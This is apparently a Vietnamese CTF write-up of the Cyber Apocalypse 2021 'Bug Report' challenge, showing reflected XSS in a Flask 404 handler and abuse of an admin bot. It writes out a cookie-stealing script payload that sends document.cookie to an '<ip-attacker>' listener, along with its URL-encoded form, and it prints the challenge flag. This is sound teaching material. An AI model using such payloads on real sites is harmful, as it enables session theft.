Bài trước (Đây là bài trước: https://viblo.asia/p/khi-co-source-code-roi-thi-hack-co-de-khong-maGK7G8AKj2), mình có đưa một câu hỏi là `Khi có source code rồi thì hack có dễ không?`. Tuy nhiên bài đó thì có vẻ cũng hơi phức tạp, nên nay mình quyết định ra một bài mới `Vẫn là có source code, nhưng hack dễ hơn`, để viết về một bài nhưng nó đỡ phức tạp hơn bài trước. Cho bạn nào mới tiếp cận review source code thì đỡ bỡ ngỡ hơn.

Nào! Bắt đầu thôi.

## 1. Đề bài

Vẫn là loạt bài writeup các challenge của cuộc thi `Cyber Apocalypse 2021`, lần này vẫn là một bài `review source code` nhưng dễ hơn. Và vẫn là câu nói cũ `Mình rất hứng thú với mấy bài review source code, vì đó là sở trường của mình.`

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png)

Source code cho như dưới đây.

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.41.31.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.41.31.png)

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.41.38.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.41.38.png)

## 2. Bắt đầu chiến nào

Như mình đã nói ở trên *lần này vẫn là một bài `review source code` nhưng dễ hơn*. Tại sao mình lại nói như thế? Vì đơn giản là nó dễ thật.

### 2.1 Tìm hiểu chức năng có lỗi

Khi mở source code, đập vào mắt mình là một chức năng gặp lỗi.
![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/error-handling-404.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/error-handling-404.png)

```py
@app.errorhandler(404)
def page_not_found(error): 
    return "<h1>URL %s not found</h1><br/>" % unquote(request.url), 404
```

Vì sao mình khẳng định là đoạn code này có lỗi?

Mình giải thích luôn, với biến `request.url` là sẽ lấy đường dẫn đầy đủ của ứng dụng. Ví dụ trong trường hợp này ứng dụng đang chạy port 1337 và đường dẫn có thể dẫn đến lỗi 404 là `/not-found`, thì `request.url` sẽ trả về là `http://domain/not-found`.

Hàm `unquote()` thì được mô tả là `Replace %xx escapes with their single-character equivalent. The optional encoding and errors parameters specify how to decode percent-encoded sequences into Unicode characters, as accepted by the bytes.decode() method.` Ok, vậy hiểu đơn giản nhé, thì nó sẽ urldecode. Ví dụ: `%22Manhnv%22` => `"Manhnv"`.

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/unquote-function.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/unquote-function.png)

Tham khảo thêm tại đây: https://docs.python.org/3/library/urllib.parse.html

Để chứng minh điều này, tôi dựng lại source trên local và chạy nó nhé.

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/not-found.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/not-found.png)

----------------------------

Oh, vậy rồi sao? làm gì tiếp theo?

Tôi để ý dòng `return "<h1>URL %s not found</h1><br/>" % unquote(request.url)`, nó sử dụng nối chuỗi để return về mà không filter hay escape gì cả, vậy thì đây là một lỗi XSS. Tôi thử một đoạn XSS đơn giản như vầy.

```txt
"><script>alert(1)</script>
```

Url encode sẽ là

```txt
%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```

Đường dẫn đầy đủ

```txt
http://138.68.147.93:31927/%22%3E%3Cscript%3Ealert(1)%3C/script%3E
```

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.43.52.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.43.52.png)

Đấy, XSS đó thấy chưa nào.

--------------------------------------

### 2.2 Tìm hiểu cách hoạt động của bot

Đến đây, có XSS rồi thì để ý tiếp nhé.

Trong source code có một file `bot.py`. Tôi cần tìm hiểu cách nó hoạt động.

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/source-code-bot.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/source-code-bot.png)

File `bot.py` có một hàm tên là `visit_report()`, tham số truyền vào là một `url`. Khi hàm này được gọi (call), ứng dụng sẽ sử dụng thư viện `selenium` dùng `chromedriver` làm browser để thực hiện mở `http://127.0.0.1:1337/`, sau đó browser sẽ được add cookie (trong cookie được add có chứa flag). Tiếp theo browser thực hiện mở đường dẫn trong biến `url` được truyền vào dòng 37 `browser.get(url)`. Đến đây, tạm thời hiểu được cách hoạt động của bot.

## 2.3 Tìm hiểu cách để call function của bot như ý

Tiếp tục tìm hiểu chức năng khác, khi vào web có một form submit như dưới

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.40.25.png)

Đại loại là: `Hãy submit cho chúng tôi URL mà bạn không truy cập được`

Khi tôi thử điền gì đó và submit thì thấy ứng dụng call đến API `/api/submit`. Nhìn lại source code xem thử ứng dụng xử lý những gì khi đi vào `/api/submit`.

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/api-submit.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/api-submit.png)

```py
@app.route("/api/submit", methods=["POST"])
def submit():
    try:
        url = request.json.get("url")
        
        assert(url.startswith('http://') or url.startswith('https://'))
        visit_report(url)

        return {"success": 1, "message": "Thank you for your valuable submition!"}
    except:
        return {"failure": 1, "message": "Something went wrong."}
```

**Giải thích:** Khi đi vào `/api/submit`, ứng dụng sẽ lấy giá trị từ biến `url` của dữ liệu gửi lên. Sau đó kiểm tra xem có phải là đường dẫn hay không bằng cách kiểm tra sự tồn tại của `http` hoặc `https` ở đầu chuỗi, nếu không có sẽ raise ra lỗi.

```py
assert(url.startswith('http://') or url.startswith('https://'))
```

Sau đó biến url sẽ được truyền vào function `visit_report()`.


## 3. Khai thác thôi

Từ những điều tìm hiểu được bên trên, tôi có thể hình dung ra ứng dụng đang có một số điểm có thể khai thác được như sau:

1. Ứng dụng gặp lỗi XSS
2. Ứng dụng có Bot sẽ request cùng cookie chứa đến đường dẫn do người dùng gửi lên.

Như vậy, ý tưởng tôi có là: Tạo một đường dẫn có XSS với payload javascript là để steal cookie và submit lên để bot request tới đường dẫn đó.

Tôi viết một payload như sau:

```txt
http://127.0.0.1:1337/<script tyle="text/javascript">document.location='http://**<ip-attacker>**:8000/?c='+document.cookie;</script>
```

Sau khi Url encode

```txt
http://127.0.0.1:1337/%3c%73%63%72%69%70%74%20%74%79%6c%65%3d%22%74%65%78%74%2f%6a%61%76%61%73%63%72%69%70%74%22%3e%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%3a%2f%2f%3c%69%70%2d%61%74%74%61%63%6b%65%72%3e%3a%38%30%30%30%2f%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%3c%2f%73%63%72%69%70%74%3e
```

Trên server của tôi, tôi tạo một http simple server như sau:

```bash
python3 -m http.server 8000
```

Bây giờ chỉ việc submit payload vào form submit.

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.48.53.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.48.53.png)

Kiểm tra server và nhận được flag.

![https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.49.24.png](https://manhnv.com/images/posts/ctf/Cyber-Apocalypse-2021/Bug-Report/Screen_Shot_2021-04-24_at_23.49.24.png)

Flag là: `CHTB{th1s_1s_my_bug_r3p0rt}`

## Kết luận

Một bài khá là dễ, tuy nhiên khá là hay.
Đọc qua bài này, hi vọng các bạn có thể hiểu cách mình tìm hiểu và khai thác lỗi khi có source code như thế nào.

Các bạn có thể đọc thêm nhiều nhiều và rất nhiều bài viết của mình tại đây: https://manhnv.com để ủng hộ mình nha.